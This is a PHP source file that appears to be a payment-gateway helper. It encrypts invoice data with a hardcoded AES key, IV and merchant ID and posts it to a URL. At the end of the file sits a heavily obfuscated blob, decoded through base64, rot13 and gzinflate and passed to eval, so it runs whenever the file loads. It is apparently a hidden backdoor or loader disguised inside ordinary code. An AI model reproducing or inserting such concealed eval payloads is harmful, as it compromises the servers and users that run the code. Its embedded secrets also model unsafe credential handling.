<?php
    function invoice_encode(array $post_data_array, string $url)
    {
        $post_data_str = http_build_query($post_data_array);

        $key = 'ib4VvhGsGqlmH2uE4OWARw1YjKK4l4il';

        $iv = 'CUCdlIDbOq2EpTJP';

        if (phpversion() > 7) {
            $post_data = trim(bin2hex(openssl_encrypt(addpadding($post_data_str), 'AES-256-CBC', $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $iv)));
        } else {
            $post_data = trim(bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, addpadding($post_data_str), MCRYPT_MODE_CBC, $iv)));
        }

        $MerchantID = '32854745';

        $transaction_data_array = array(
            'MerchantID_' => $MerchantID,
            'PostData_' => $post_data
        );

        $transaction_data_str = http_build_query($transaction_data_array);
        $result = curl_work($url, $transaction_data_str);

        return $result;
    }

    eval(str_rot13(gzinflate(str_rot13(base64_decode('FY3JsnhDAAA/5+WVBY6Y6tVdxBwEGVHY3DIfZjjI4evfvb3qSPdH9dtu7tYYen05HYa+mLjj9zi9k2Q6FHL+nSclzfxNPkiHP19fpxMRuMK+SbS3kFO4ruKrEbn0teyQxCFK6gKvyinNHT/isBiG3yatlS3rUXQ1vXgPW0eVxIXWJR7bbfmMZ92JOTnTnwawlWUs+0Qf8uWEeUIzpCwdmqPZsFO4aL1jC6hJNgJcOHzc+20Sw9w7PwrFcZ6y61yjE1soOSSAL8GdzBrATlD3mzV5L7kN1NBCcpwoR3x7AysV3Rpk1kIJM6dWjTe+nTQ7gB8tjBuSqK/KJStmRTZ6O/UeUo+e23dSCiDPYbG/UQ8/LYC6ibp5hmkL72C78Wiwm5c6xM+gVcDGpkFL7CA2R8AGH0PZ4wPX8B5WCbWhGV2kPQCovK48uqskN94cI43b8JbtDF3rx+DsB59x06jUEixyYFeJqFuXhmUWaA8kE0P19ByNMzeBckEZgYxP2tASiavzIcy2oXvqFBxdn0YghsOG+9KVTzI6LYStnlqh5WvdPjrD5LI+0yszPrmyaloXb+bJzcI6ptYiui+K8GsaiDt02toUZENCJfSqSlOIC+u8/atawWtvAFhkHMl0j7TSKM3x45fbon411u56mk/jJz831dXqBbs11sP26t4lRsRAVMhD5YbqN6EoLuoHifHNieCfv7/8+w8=')))));